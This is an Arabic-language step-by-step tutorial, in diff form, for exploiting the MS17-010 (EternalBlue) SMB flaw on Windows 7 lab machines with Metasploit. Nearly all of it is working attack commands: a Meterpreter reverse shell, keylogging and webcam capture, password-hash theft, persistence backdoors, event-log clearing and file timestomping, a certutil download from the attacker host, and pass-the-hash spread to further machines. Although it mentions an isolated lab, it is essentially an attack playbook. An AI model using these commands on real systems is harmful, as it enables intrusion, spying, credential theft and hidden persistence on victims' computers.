@@ -1,0 +1,558 @@
+🚀 شرح نهائي شامل لكل شيء في استغلال ثغرة SMB
+
+🎯 الفصل 1: فهم الثغرة تماماً
+
+ما هي MS17-010 (EternalBlue)؟
+
+```
+خلل في SMBv1 في Windows → Buffer Overflow → تنفيذ كود عن بعد
+```
+
+مثل: نافذة السيارة مفتوحة → تمد يدك → تفتح الباب → تسرق السيارة
+
+لماذا Windows 7 فقط؟
+
+1. SMBv1 مفعل تلقائياً (Windows 10 يعطله)
+2. لا تحديثات أمنية (منتهي الدعم 2020)
+3. صلاحيات ضعيفة (Admin بدون باسورد)
+
+---
+
+🔧 الفصل 2: الإعداد الأولي
+
+1. التحقق من الشبكة:
+
+```bash
+# في كالي، افتح Terminal واكتب:
+ifconfig
+```
+
+يجب يظهر: eth0: inet 192.168.146.128
+
+```bash
+# تحقق من الاتصال بالهدف
+ping 192.168.146.133
+```
+
+إذا طلع: 64 bytes from 192.168.146.133 ← الاتصال سليم
+
+2. فحص الثغرة:
+
+```bash
+# طريقة 1: nmap
+sudo nmap --script smb-vuln-ms17-010 -p 445 192.168.146.133
+
+# طريقة 2: داخل msfconsole
+msfconsole
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS 192.168.146.133
+run
+```
+
+النتيجة المتوقعة:
+
+```
+[+] 192.168.146.133:445 - Host is likely VULNERABLE to MS17-010!
+```
+
+---
+
+⚔️ الفصل 3: الاستغلال الكامل
+
+الطريقة المضمونة:
+
+```bash
+msfconsole
+
+# 1. تحميل exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# 2. عرض الخيارات المطلوبة
+show options
+
+# 3. تعيين الهدف
+set RHOSTS 192.168.146.133
+
+# 4. تعيين IP كالي
+set LHOST 192.168.146.128
+
+# 5. اختيار payload (هام جداً)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 6. (اختياري) تغيير المنفذ
+set LPORT 5555
+
+# 7. (اختياري) لزيادة فرص النجاح
+set AutoRunScript migrate -f
+set ExitOnSession false
+
+# 8. التنفيذ
+exploit
+```
+
+ماذا يحدث خطوة بخطوة:
+
+```
+1. [-] = بدأ الاتصال
+2. [*] = إرسال الحزم
+3. [+] = نجاح مرحلة
+4. [*] Meterpreter session = نجاح كامل
+```
+
+---
+
+🛠️ الفصل 4: جميع أوامر Meterpreter
+
+4.1 معلومات النظام:
+
+```bash
+sysinfo          # Computer: WIN7-PC, OS: Windows 7
+getuid           # Server username: NT AUTHORITY\SYSTEM (إذا نجح getsystem)
+getpid           # Current pid: 1234
+ps               # عرض جميع العمليات
+kill 1234        # قتل عملية برقم PID
+pkill explorer.exe  # قتل عملية بالاسم
+```
+
+4.2 التحكم بالعمليات:
+
+```bash
+# الانتقال لعملية أخرى (مهم للاستقرار)
+migrate 580      # الانتقال لـ services.exe (مستقر)
+migrate -N explorer.exe  # الانتقال لـ explorer.exe
+
+# إذا لم تعرف PID، ابحث:
+ps | grep -i explorer
+# ثم انسخ PID واستخدم migrate
+```
+
+4.3 التنقل في الملفات:
+
+```bash
+pwd              # اعرف مكانك الحالي
+cd C:\\Users     # غير المجلد (يجب \\)
+ls               # عرض الملفات
+dir              # نفس ls
+download "C:\\Windows\\System32\\config\\SAM" /tmp/  # تنزيل ملف
+upload /home/kali/payload.exe "C:\\Windows\\Temp\\"  # رفع ملف
+```
+
+4.4 تنفيذ الأوامر:
+
+```bash
+shell            # افتح cmd (قد يعلق)
+# إذا علق shell، اضغط Ctrl+Z للخروج
+
+# بديل أفضل:
+execute -f cmd.exe -i  # يفتح cmd بشكل مستقر
+# أو
+execute -H -f cmd.exe -c  # يخفي النافذة
+```
+
+4.5 التجسس:
+
+```bash
+# لقطة شاشة (يحتاج SYSTEM)
+screenshot
+# سيحفظ الصورة في /home/kali/
+
+# تسجيل ضغطات
+keyscan_start    # بدء التسجيل
+keyscan_dump     # عرض المسجل
+keyscan_stop     # إيقاف التسجيل
+
+# كاميرا
+webcam_list      # عرض الكاميرات
+webcam_snap 1    # التقاط صورة
+```
+
+4.6 تصعيد الصلاحيات:
+
+```bash
+getsystem        # تصعيد لـ SYSTEM (أهم أمر)
+# إذا نجح: ...got system via technique 1
+# إذا فشل: جرب shell أولاً ثم حاول يدوياً
+```
+
+4.7 سرقة المعلومات:
+
+```bash
+hashdump         # سرقة كلمات المرور (يحتاج SYSTEM)
+# النتيجة: Administrator:500:aad3b...:31d6c...:::
+
+run post/windows/gather/enum_logged_on_users  # المستخدمون المتصلون
+run post/windows/gather/enum_applications     # البرامج المثبتة
+```
+
+4.8 الثباتية:
+
+```bash
+# إضافة للتشغيل التلقائي
+run persistence -X -i 30 -p 4444 -r 192.168.146.128
+# -X = التشغيل عند Startup
+# -i 30 = حاول الاتصال كل 30 ثانية
+
+# أو عن طريق registry
+reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Update -d "C:\\Windows\\Temp\\backdoor.exe"
+```
+
+4.9 التنظيف:
+
+```bash
+clearev          # مسح Event Logs
+timestomp "C:\\malware.exe" -z "01/01/2020 12:00:00"  # تغيير وقت الملف
+```
+
+---
+
+🔄 الفصل 5: الانتقال لجهاز آخر
+
+الطريقة 1: استخدام نفس الـ exploit
+
+```bash
+# من meterpreter
+background       # ارجع لـ msfconsole مع بقاء الجلسة
+
+# الآن أنت في msfconsole
+# غير الهدف فقط
+set RHOSTS 192.168.146.134
+exploit
+```
+
+الطريقة 2: Pass-the-Hash (الأفضل)
+
+```bash
+# 1. من الجلسة الأولى، سرق الـ hashes
+meterpreter > hashdump
+# انسخ الـ NT Hash (الجزء الثاني بعد :)
+
+# 2. ارجع لـ msfconsole
+background
+
+# 3. استخدم psexec مع الـ hash
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.146.134
+set SMBUser Administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+# ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+# هذا هو الـ hash المسروق
+
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.146.128
+set LPORT 6666  # غير المنفذ عشان ما يتعارض
+exploit
+```
+
+الطريقة 3: WMI Exec
+
+```bash
+# إذا كان الـ hash ما اشتغل
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.146.134
+set SMBUser Administrator
+set SMBPass Password123  # جرب كلمة مرور بسيطة
+exploit
+```
+
+---
+
+⚠️ الفصل 6: حل المشاكل الشائعة
+
+مشكلة: "Exploit completed but no session"
+
+الأسباب:
+
+1. Payload غير مناسب ← جرب windows/shell/reverse_tcp
+2. الهدف مش vulnerable ← تحقق بـ check
+3. جدار الحماية ← عطله أو غير المنفذ
+
+الحل:
+
+```bash
+set PAYLOAD windows/shell/reverse_tcp
+set LPORT 80  # أو 443 أو 8080
+set AutoRunScript migrate -f
+exploit
+```
+
+مشكلة: "Handler failed to bind"
+
+```bash
+# IP كالي خطأ، صححه:
+ifconfig
+set LHOST [IP الصحيح]
+# أو
+set LHOST 0.0.0.0  # يستمع على كل الـ IPs
+```
+
+مشكلة: الجلسة تنقطع
+
+```bash
+# داخل meterpreter
+getpid           # اعرف PID الحالي
+migrate [PID أكبر]  # انتقل لعملية مستقرة
+# PID جيد: 580 (services.exe) أو 1234 (explorer.exe)
+```
+
+مشكلة: upload فشل
+
+```bash
+# 1. تأكد من الصلاحيات
+getsystem
+
+# 2. استخدم المسار الصحيح
+upload /home/kali/file.exe C:\\Windows\\Temp\\file.exe
+
+# 3. جرب طريقة بديلة
+shell
+C:\> certutil -urlcache -f http://192.168.146.128/file.exe C:\Windows\Temp\file.exe
+```
+
+مشكلة: screenshot لا يعمل
+
+```bash
+# 1. اصعد الصلاحيات أولاً
+getsystem
+
+# 2. قد لا يدعم النظام، جرب:
+screengrab
+# أو
+run vnc
+```
+
+---
+
+🎯 الفصل 7: exploit المناسب لكل حالة
+
+1. Windows 7 64-bit (الأكثر شيوعاً):
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+```
+
+2. Windows 7 32-bit:
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set PAYLOAD windows/meterpreter/reverse_tcp
+set TARGET 0  # Windows XP/2003
+```
+
+3. إذا فشل EternalBlue:
+
+```bash
+# جرب psexec مع null session
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.146.133
+set SMBUser ''
+set SMBPass ''
+set PAYLOAD windows/shell/reverse_tcp
+```
+
+4. إذا كان SMB Signing مفعل:
+
+```bash
+# تحتاج Responder + NTLM Relay
+# لكن هذا متقدم، ركز على الأساسيات أولاً
+```
+
+---
+
+📊 الفصل 8: جدول أوامر مرجعي
+
+الأمر الوصف متى يستخدم
+msfconsole فتح Metasploit البداية
+search eternalblue بحث عن exploit قبل الهجوم
+use exploit/... تحميل exploit بعد البحث
+show options عرض الإعدادات قبل set
+set RHOSTS [IP] تعيين الهدف قبل exploit
+set LHOST [IP] تعيين IP كالي قبل exploit
+set PAYLOAD ... اختيار payload قبل exploit
+exploit تنفيذ الهجوم بعد الإعداد
+sysinfo معلومات النظام بعد الاختراق
+getuid معرفة المستخدم بعد الاختراق
+getsystem تصعيد الصلاحيات إذا كنت Admin
+hashdump سرقة كلمات المرور إذا كنت SYSTEM
+shell فتح cmd للتنفيذ المباشر
+upload رفع ملف إذا كنت SYSTEM
+download تنزيل ملف إذا كنت SYSTEM
+background الرجوع لـ msfconsole للانتقال لهدف آخر
+sessions عرض الجلسات في msfconsole
+sessions -i 1 الدخول لجلسة في msfconsole
+
+---
+
+🔐 الفصل 9: فهم الصلاحيات والأخطاء
+
+لماذا getsystem مهم؟
+
+```
+بدون SYSTEM:
+- لا hashdump ❌
+- لا upload لبعض المسارات ❌
+- لا screenshot ❌
+- محدود الصلاحيات ❌
+
+مع SYSTEM:
+- كل شيء ممكن ✅
+- تحكم كامل ✅
+- سرقة كل المعلومات ✅
+```
+
+هيكل الـ Hash المسروق:
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+└──┬──┘ └┬┘ └─────────────┬─────────────┘ └─────────────┬─────────────┘
+  User   RID     LM Hash (قديم)           NT Hash (هام)
+```
+
+الـ NT Hash هو المهم للـ Pass-the-Hash
+
+---
+
+🔄 الفصل 10: سيناريو كامل من الألف للياء
+
+اليوم الأول: اختراق Windows 7-1
+
+```bash
+# 1. ابدأ
+msfconsole
+
+# 2. ابحث واستخدم
+search eternalblue
+use 0
+
+# 3. عين الإعدادات
+set RHOSTS 192.168.146.133
+set LHOST 192.168.146.128
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# 4. هاجم
+exploit
+
+# 5. إذا نجح
+meterpreter > sysinfo
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > hashdump
+meterpreter > screenshot
+```
+
+اليوم الثاني: الانتقال لـ Windows 7-2
+
+```bash
+# 1. من meterpreter
+background
+
+# 2. استخدم نفس الـ exploit للجهاز الثاني
+set RHOSTS 192.168.146.134
+exploit
+
+# 3. أو باستخدام الـ hash المسروق
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.146.134
+set SMBUser Administrator
+set SMBPass [الـ hash من اليوم الأول]
+exploit
+```
+
+اليوم الثالث: الثباتية والتحكم
+
+```bash
+# 1. أنشئ backdoor
+run persistence -X -i 30 -p 4444 -r 192.168.146.128
+
+# 2. ارفع أدوات
+upload /home/kali/mimikatz.exe C:\\Windows\\Temp\\
+
+# 3. سرق معلومات أكثر
+run post/windows/gather/enum_chrome
+run post/windows/gather/enum_ie
+```
+
+---
+
+🎓 الفصل 11: نصائح نهائية
+
+قبل أي هجوم:
+
+1. ✅ تأكد من العزل (كل VMs في نفس الشبكة)
+2. ✅ خذ Snapshot (إذا فشلت ترجع)
+3. ✅ دون ملاحظات (ما تتعلمه)
+
+إذا فشل exploit:
+
+1. جرب windows/shell/reverse_tcp بدل meterpreter
+2. غير المنفذ (4444 → 5555 → 80 → 443)
+3. تحقق من IPs واتصال الشبكة
+4. جرب psexec مع كلمات مرور بسيطة
+
+للفهم السريع:
+
+1. SMBv1 = الباب المفتوح
+2. EternalBlue = المفتاح السري
+3. Meterpreter = يدك داخل النظام
+4. Hashdump = مفتاح كل الأبواب
+5. Pass-the-Hash = فتح أبواب أخرى
+
+---
+
+📞 إذا واجهت مشكلة:
+
+اسأل نفسك:
+
+1. هل الـ IPs صحيحة؟ ifconfig + ipconfig
+2. هل البورت 445 مفتوح؟ nmap -p 445
+3. هل النظام vulnerable؟ nmap --script smb-vuln-ms17-010
+4. هل الـ payload مناسب؟ جرب shell بدل meterpreter
+
+الأخطاء الشائعة وحلولها:
+
+```bash
+# خطأ: "No payload configured"
+الحل: set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# خطأ: "Connection refused"
+الحل: ping الهدف، تحقق من الشبكة
+
+# خطأ: "Session died"
+الحل: استخدم migrate فور الدخول
+
+# خطأ: "Access denied"
+الحل: getsystem أولاً
+```
+
+---
+
+🚀 الخلاصة النهائية:
+
+الأوامر الضرورية فقط:
+
+```bash
+# 1. الهجوم
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.146.133
+set LHOST 192.168.146.128
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+exploit
+
+# 2. بعد الاختراق
+getsystem
+hashdump
+background
+
+# 3. الانتشار
+set RHOSTS 192.168.146.134
+exploit
+```
+
+التسلسل المنطقي:
+
+```
+افتح msfconsole → ابحث → استخدم → عين → هاجم → اصعد → اسرق → انتشر
+```
+
+الآن أنت تعرف كل شيء. ابدأ بالتجربة العميقة، واكتب لي أي خطأ تواجهه بالضبط!
